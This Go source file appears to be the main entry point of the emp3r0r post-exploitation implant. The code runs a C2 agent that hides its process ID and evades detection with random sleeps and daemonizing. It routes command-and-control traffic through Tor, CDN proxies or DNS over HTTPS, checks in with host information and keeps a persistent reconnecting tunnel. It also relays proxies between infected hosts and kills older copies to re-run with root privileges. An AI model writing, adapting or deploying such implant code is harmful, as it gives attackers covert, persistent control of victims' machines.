package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

func main() {
	var err error
	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
	silent := flag.Bool("silent", false, "Suppress output")
	daemon := flag.Bool("daemon", false, "Daemonize")
	version := flag.Bool("version", false, "Show version info")
	flag.Parse()

	// version
	if *version {
		fmt.Printf("emp3r0r agent (%s)\n", agent.Version)
		return
	}

	// don't be hasty
	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)

	// silent switch
	log.SetOutput(ioutil.Discard)
	if !*silent {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)
	}

	// mkdir -p
	if !util.IsFileExist(agent.UtilsPath) {
		err = os.MkdirAll(agent.UtilsPath, 0700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
		}
	}

	// daemonize
	if *daemon {
		args := os.Args[1:]
		i := 0
		for ; i < len(args); i++ {
			if args[i] == "-daemon=true" || args[i] == "-daemon" {
				args[i] = "-daemon=false"
				break
			}
		}
		cmd := exec.Command(os.Args[0], args...)
		err := cmd.Start()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
		os.Exit(0)
	}

	// if the agent's process name is not "emp3r0r"
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}

		// exit, leave the existing agent instance running
		if agent.IsAgentAlive() {
			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
				log.Println("Escalating privilege...")
			} else {
				log.Fatal("Agent is already running and responsive, aborting")
			}
		}

		// if agent is not responsive, kill it, and start a new instance
		err = proc.Kill()
		if err != nil {
			log.Println("Failed to kill old emp3r0r", err)
		}
	}

	// start socket listener
	go socketListen()

	// parse C2 address
	agent.CCIP = strings.Split(agent.CCAddress, "/")[2]
	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
	if tun.ValidateIP(agent.CCIP) {
		agent.CCAddress = fmt.Sprintf("%s:%s/", agent.CCAddress, agent.CCPort)
	} else {
		agent.CCAddress += "/"
	}

	// if CC is behind tor, a proxy is needed
	if tun.IsTor(agent.CCAddress) {
		log.Printf("CC is on TOR: %s", agent.CCAddress)
		agent.Transport = fmt.Sprintf("TOR (%s)", agent.CCAddress)
		agent.AgentProxy = *c2proxy
		if *c2proxy == "" {
			agent.AgentProxy = "socks5://127.0.0.1:9050"
		}
		log.Printf("CC is on TOR (%s), using %s as TOR proxy", agent.CCAddress, agent.AgentProxy)
	}

	// if user specified a proxy, use it
	if *c2proxy != "" {
		agent.AgentProxy = *c2proxy
	}

	// if user wants to use CDN proxy
	if *cdnProxy != "" {
		go func() {
			// DoH server
			dns := "https://9.9.9.9/dns-query"
			if *doh != "" {
				dns = *doh
			}

			// you can change DoH server here if needed
			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, dns)
			if err != nil {
				log.Fatal(err)
			}
		}()
		agent.Transport = fmt.Sprintf("CDN (%s)", *cdnProxy)
		agent.AgentProxy = "socks5://127.0.0.1:10888"
	}

	// hide process of itself if possible
	err = agent.UpdateHIDE_PIDS()
	if err != nil {
		log.Print(err)
	}

	// agent root
	if !util.IsFileExist(agent.AgentRoot) {
		err = os.MkdirAll(agent.AgentRoot, 0700)
		if err != nil {
			log.Printf("MkdirAll %s: %v", agent.AgentRoot, err)
		}
	}

	// do we have internet?
	if tun.HasInternetAccess() {
		// if we do, we are feeling helpful
		ctx, cancel := context.WithCancel(context.Background())
		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
		go agent.StartBroadcast(true, ctx, cancel)

	} else if !tun.IsTor(agent.CCAddress) && !tun.IsProxyOK(agent.AgentProxy) {
		// we don't, just wait for some other agents to help us
		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
		ctx, cancel := context.WithCancel(context.Background())
		go func() {
			err := agent.BroadcastServer(ctx, cancel, "")
			if err != nil {
				log.Fatal(err)
			}
		}()
		for ctx.Err() == nil {
			if agent.AgentProxy != "" {
				log.Printf("[+] Thank you! We got a proxy: %s", agent.AgentProxy)
				break
			}
		}
	}

	// apply whatever proxy setting we have just added
	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
	log.Printf("Using proxy: %s", agent.AgentProxy)
connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if !agent.IsCCOnline(agent.AgentProxy) {
		log.Println("CC not online")
		time.Sleep(time.Duration(util.RandInt(1, 120)) * time.Minute)
		goto connect
	}

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Printf("Checked in on CC: %s", agent.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := agent.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	agent.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	err = agent.CCMsgTun(ctx, cancel)
	if err != nil {
		log.Printf("CCMsgTun: %v, reconnecting...", err)
	}
	goto connect
}

// listen on a unix socket
func socketListen() {
	// if socket file exists
	if util.IsFileExist(agent.SocketName) {
		log.Printf("%s exists, testing connection...", agent.SocketName)
		if agent.IsAgentAlive() {
			log.Fatalf("%s exists, and agent is alive, aborting", agent.SocketName)
		}
		err := os.Remove(agent.SocketName)
		if err != nil {
			log.Fatalf("Failed to delete socket: %v", err)
		}
	}

	l, err := net.Listen("unix", agent.SocketName)
	if err != nil {
		log.Fatal("listen error:", err)
	}

	for {
		fd, err := l.Accept()
		if err != nil {
			log.Fatal("accept error:", err)
		}
		go server(fd)
	}
}

// handle connections to our socket: echo whatever we get
func server(c net.Conn) {
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}

		data := buf[0:nr]
		log.Println("Server got:", string(data))
		_, err = c.Write(data)
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}
